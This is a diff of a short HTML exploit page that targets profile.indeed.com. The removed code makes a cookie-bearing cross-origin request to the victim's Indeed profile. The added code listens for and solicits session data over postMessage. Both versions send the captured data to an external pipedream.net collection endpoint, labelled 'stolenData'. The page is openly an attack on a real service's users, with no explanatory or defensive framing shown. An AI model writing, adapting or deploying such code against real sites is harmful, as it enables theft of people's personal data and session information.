@@ -1,25 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Steal Indeed Data</title>
-</head>
-<body>
+    <title>postMessage Exploit</title>
     <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://profile.indeed.com", true);
-        xhr.withCredentials = true;  // Include victim's session cookies
-
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState === XMLHttpRequest.DONE) {
+        window.addEventListener("message", function(event) {
+            // Ensure message is from Indeed
+            if (event.origin === "https://profile.indeed.com") {
                 fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ data: xhr.responseText })
+                    body: JSON.stringify({ stolenData: event.data })
                 });
             }
-        };
+        }, false);
 
-        xhr.send();
+        // Send malicious postMessage request to Indeed
+        window.onload = function() {
+            window.postMessage({ action: "getSessionData" }, "https://profile.indeed.com");
+        };
     </script>
+</head>
+<body>
+    <h1>Loading...</h1>
 </body>
 </html>
